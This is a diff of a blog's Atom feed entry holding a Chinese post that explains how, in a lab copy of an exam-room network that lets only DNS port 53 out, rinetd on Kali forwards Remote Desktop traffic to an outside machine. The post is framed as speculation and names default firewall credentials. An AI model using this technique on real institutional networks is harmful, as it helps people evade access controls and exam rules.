+  </entry>
+  
+  <entry>
     <title>RINET 的妙用</title>
-    <link href="http://TimeS0ng.github.io/2017/12/23/RINETD%20%E7%9A%84%E5%A6%99%E7%94%A8/"/>
-    <id>http://TimeS0ng.github.io/2017/12/23/RINETD 的妙用/</id>
+    <link href="http://TimeS0ng.github.io/2017/12/23/RINETD%E7%9A%84%E5%A6%99%E7%94%A8/"/>
+    <id>http://TimeS0ng.github.io/2017/12/23/RINETD的妙用/</id>
     <published>2017-12-23T02:07:44.000Z</published>
-    <updated>2017-12-27T11:47:13.236Z</updated>
+    <updated>2018-12-18T15:32:18.788Z</updated>
     
     <content type="html"><![CDATA[<h2 id="0x00-闲言"><a href="#0x00-闲言" class="headerlink" title="0x00. 闲言"></a>0x00. 闲言</h2><h4 id="emsp-emsp-最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。"><a href="#emsp-emsp-最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。" class="headerlink" title="&emsp;&emsp;最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。"></a>&emsp;&emsp;最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。</h4><a id="more"></a>
 <h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01. 环境搭建"></a>0x01. 环境搭建</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备:"></a><strong>环境准备:</strong></h3><h4 id="emsp-emsp-1-kali-linux-（-工具：rinetd-IP-192-168-1-104"><a href="#emsp-emsp-1-kali-linux-（-工具：rinetd-IP-192-168-1-104" class="headerlink" title="&emsp;&emsp;1. kali linux （ 工具：rinetd )  IP = 192.168.1.104"></a>&emsp;&emsp;1. kali linux （ 工具：rinetd )  IP = 192.168.1.104</h4><h4 id="emsp-emsp-2-win-xp-emsp-IP-1-1-1-103"><a href="#emsp-emsp-2-win-xp-emsp-IP-1-1-1-103" class="headerlink" title="&emsp;&emsp;2. win xp &emsp; IP = 1.1.1.103"></a>&emsp;&emsp;2. win xp &emsp; IP = 1.1.1.103</h4><h4 id="emsp-emsp-3-win-xp-emsp-IP-192-168-1-109"><a href="#emsp-emsp-3-win-xp-emsp-IP-192-168-1-109" class="headerlink" title="&emsp;&emsp;3. win xp &emsp; IP = 192.168.1.109"></a>&emsp;&emsp;3. win xp &emsp; IP = 192.168.1.109</h4><h4 id="emsp-emsp-4-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-112"><a href="#emsp-emsp-4-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-112" class="headerlink" title="&emsp;&emsp;4. monowall &emsp; LAN IP = 1.1.1.1 &emsp; WAN IP = 192.168.1.112"></a>&emsp;&emsp;4. monowall &emsp; LAN IP = 1.1.1.1 &emsp; WAN IP = 192.168.1.112</h4><blockquote>
 <p>[*]这里有monowall的简单<a href="http://www.heminjie.com/network/567.html" target="_blank" rel="external">配置方法</a></p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181026_6raRvt_6724.jpeg" alt=""></p>
-<h3 id="配置路由表"><a href="#配置路由表" class="headerlink" title="配置路由表:"></a><strong>配置路由表:</strong></h3><h4 id="emsp-emsp-在xp中访问1-1-1-1进入防火墙配置页面，账号admin-密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）"><a href="#emsp-emsp-在xp中访问1-1-1-1进入防火墙配置页面，账号admin-密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）" class="headerlink" title="&emsp;&emsp;在xp中访问1.1.1.1进入防火墙配置页面，账号admin 密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）"></a>&emsp;&emsp;在xp中访问1.1.1.1进入防火墙配置页面，账号admin 密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181041_6P6SB8_6728.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/RINET%E7%9A%84%E5%A6%99%E7%94%A8/20171227181026_6raRvt_6724.jpeg" alt=""></p>
+<h3 id="配置路由表"><a href="#配置路由表" class="headerlink" title="配置路由表:"></a><strong>配置路由表:</strong></h3><h4 id="emsp-emsp-在xp中访问1-1-1-1进入防火墙配置页面，账号admin-密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）"><a href="#emsp-emsp-在xp中访问1-1-1-1进入防火墙配置页面，账号admin-密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）" class="headerlink" title="&emsp;&emsp;在xp中访问1.1.1.1进入防火墙配置页面，账号admin 密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）"></a>&emsp;&emsp;在xp中访问1.1.1.1进入防火墙配置页面，账号admin 密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）</h4><p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/RINET%E7%9A%84%E5%A6%99%E7%94%A8/20171227181041_6P6SB8_6728.jpeg" alt=""></p>
 <h2 id="0x02-实验步骤"><a href="#0x02-实验步骤" class="headerlink" title="0x02. 实验步骤"></a>0x02. 实验步骤</h2><h4 id="emsp-emsp-上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192-168-1-109的xp。"><a href="#emsp-emsp-上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192-168-1-109的xp。" class="headerlink" title="&emsp;&emsp;上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192.168.1.109的xp。"></a>&emsp;&emsp;上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192.168.1.109的xp。</h4><h4 id="1-首先，在kali中下载安装-rinetd-用于转发流量"><a href="#1-首先，在kali中下载安装-rinetd-用于转发流量" class="headerlink" title="1. 首先，在kali中下载安装 rinetd 用于转发流量"></a>1. 首先，在kali中下载安装 rinetd 用于转发流量</h4><blockquote>
 <p>apt-get install rinetd </p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181054_YeYibU_6744.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/RINET%E7%9A%84%E5%A6%99%E7%94%A8/20171227181054_YeYibU_6744.jpeg" alt=""></p>
 <h4 id="2-然后，修改-rinetd-的配置文件，指定转发规则"><a href="#2-然后，修改-rinetd-的配置文件，指定转发规则" class="headerlink" title="2. 然后，修改 rinetd 的配置文件，指定转发规则"></a>2. 然后，修改 rinetd 的配置文件，指定转发规则</h4><blockquote>
 <p>vim /etc/rinetd.conf</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181106_543GvN_6763.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/RINET%E7%9A%84%E5%A6%99%E7%94%A8/20171227181106_543GvN_6763.jpeg" alt=""></p>
 <h4 id="3-启动rinetd"><a href="#3-启动rinetd" class="headerlink" title="3. 启动rinetd"></a>3. 启动rinetd</h4><blockquote>
 <p>rinetd</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181117_VhwPW6_6758.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/RINET%E7%9A%84%E5%A6%99%E7%94%A8/20171227181117_VhwPW6_6758.jpeg" alt=""></p>
 <h4 id="4-启动远程桌面连接xp"><a href="#4-启动远程桌面连接xp" class="headerlink" title="4. 启动远程桌面连接xp"></a>4. 启动远程桌面连接xp</h4><blockquote>
 <p>mstsc</p>
 </blockquote>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181129_87n6je_6771.jpeg" alt=""></p>
-<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181142_MFoUyV_6773.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/RINET%E7%9A%84%E5%A6%99%E7%94%A8/20171227181129_87n6je_6771.jpeg" alt=""></p>
+<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/RINET%E7%9A%84%E5%A6%99%E7%94%A8/20171227181142_MFoUyV_6773.jpeg" alt=""></p>
 <h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境-o"><a href="#emsp-emsp-现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境-o" class="headerlink" title="&emsp;&emsp;现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境\^o^"></a>&emsp;&emsp;现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境\^o^</h4>]]></content>
     
     <summary type="html">
